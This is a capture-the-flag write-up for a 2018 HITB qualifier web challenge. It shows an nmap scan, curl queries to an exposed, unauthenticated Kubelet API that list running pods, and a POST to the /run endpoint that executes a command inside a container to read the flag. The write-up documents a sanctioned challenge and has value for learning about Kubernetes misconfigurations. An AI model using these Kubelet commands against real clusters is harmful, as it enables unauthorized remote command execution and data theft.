---
title: "HITB GSEC Qualifiers 2018 - Baby Baby (Web)"
header:
  overlay_image: /assets/images/hitbgsecquals2018/babybaby/header.jpg
  overlay_filter: 0.5
  caption: "Photo credit: Sam Goodgame on Unsplash"
tags:
  - hitbgsecquals2018
  - writeup
  - web
---

An exposed Kubelets port in a vulnerable deployment allows an attacker to run
commands without authentication remotely within containers.

## Challenge Description

```
This is a pentest challenge, target 47.75.146.42

http://47.75.146.42
```

#### Points

487 Points

22 Solved

## Solution

First, we scan the machine for exposed ports.

```shell
$ nmap -p- 47.75.146.42

Starting Nmap 7.60 ( https://nmap.org ) at 2018-04-14 00:44 +08
Nmap scan report for 47.75.146.42
Host is up (0.047s latency).
Not shown: 65527 filtered ports
PORT      STATE  SERVICE
22/tcp    open   ssh
80/tcp    open   http
443/tcp   closed https
2333/tcp  closed snapp
3389/tcp  closed ms-wbt-server
8009/tcp  closed ajp13
9999/tcp  open   abyss
10250/tcp open   unknown

Nmap done: 1 IP address (1 host up) scanned in 119.33 seconds
```

The port 10250 looks interesting and after a poking at it for a bit, we can
evoke a response from it.

```shell
curl -k https://47.75.146.42:10250/stats/
{
  "name": "/",
  "subcontainers": [
   {
    "name": "/docker"
   },
   {
    "name": "/kubepods"
   },
   {
    "name": "/system.slice"
   },
   {
    "name": "/user.slice"
   }
  ],
  "spec": {
   "creation_time": "2018-04-13T04:42:43.504+08:00",
   "has_cpu": true,
   "cpu": {
    "limit": 1024,
    "max_limit": 0,
...
```

It's the Kubelet service. Turns out that you can run commands in the containers
with this. (https://github.com/kayrus/kubelet-exploit) First, we need to get
the namespace, pod name, and container name.

```shell
curl -k https://47.75.146.42:10250/runningpods/ | jq
...
    {
      "metadata": {
        "name": "web-test-4092782360-035qx",
        "namespace": "esn-system",
        "uid": "a8f7e307-3e14-11e8-838a-00163e0245e7",
        "creationTimestamp": null
      },
      "spec": {
        "containers": [
          {
            "name": "web-test",
            "image": "127.0.0.1:5000/esn-containers/web_test@sha256:ae129fcd94b
d2978db37050f95c62311f5bf9fdbba25817e6e8a098db3a168cf",
            "resources": {}
          }
        ]
      },
      "status": {}
    },
```

From the above, we can see that:

* Namespace: esn-system
* Pod Name: web-test-4092782360-035qx
* Container Name: web-test

Now, we can run commands on the remote webserver:

```shell
curl -k -XPOST \
"https://47.75.146.42:10250/run/esn-system/web-test-4092782360-035qx/web-test" \
-d "cmd=cat /flag.txt"
HITB{KKKKKKKKKKKKKKKKKKKKKKKKK}


DO NOT MODIFY ANYTHING.
WE WILL BAN YOUR TEAM IF YOU CHANG FLAG, DELETE FILES, ETC.

如果你修改、删除文件，我们会 ban 掉你 :D
```

Flag: **HITB{KKKKKKKKKKKKKKKKKKKKKKKKK}**
